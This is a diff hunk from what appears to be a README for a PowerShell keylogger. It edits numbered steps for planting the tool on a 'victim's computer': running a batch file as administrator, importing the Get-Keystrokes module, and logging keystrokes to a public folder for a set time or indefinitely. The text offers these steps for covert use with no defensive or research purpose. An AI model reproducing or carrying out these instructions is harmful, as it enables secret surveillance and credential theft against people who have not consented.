@@ -18,10 +18,10 @@ What you need to do is:
 
 1. Get access to the victim's computer.
 2. Copy the folder to the Deskop.
-3. Run the batch file which will copy the keylogger to the powershell directory on the drive.
-4. Run a command prompt ( Windowskey + r)
+3. Run the batch file AS AN ADMINISTRATOR which will copy the keylogger to the powershell directory on the drive.
+4. Press ( Windowskey + r)
 5. type: powershell  and then press enter.
-6. Type: Import-Module Get-Keystores
+6. Type: Import-Module Get-Keystrokes
 7. Type: Get-Keystrokes -LogPath C:\Users\Public\Keys.log -CollectionInterval X (replace the X with
 			amount of minutes you want to record keystrokes. You may leave this command out and it will record indefinitely. 
 			Beware that this may make a HUGE file on their machine.
